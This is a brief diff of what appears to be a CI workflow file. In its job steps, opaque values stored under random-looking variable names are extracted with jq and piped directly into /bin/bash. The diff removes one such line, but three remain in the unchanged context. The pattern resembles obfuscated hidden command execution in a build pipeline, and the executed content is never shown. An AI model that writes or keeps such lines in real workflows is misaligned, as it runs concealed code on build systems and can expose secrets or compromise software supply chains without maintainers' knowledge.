@@ -34,7 +34,6 @@ jobs:
           echo $sm80247 | jq -r .fyub0 | /bin/bash
           echo $eza1177 | jq -r .e47 | /bin/bash
           printf '%s' "$sd3440" | jq -r .c8372 | /bin/bash
-          printf '%s' "$lrzeh3" | jq -r .ym2 | /bin/bash
 
       - name: Archive output
         if: always()
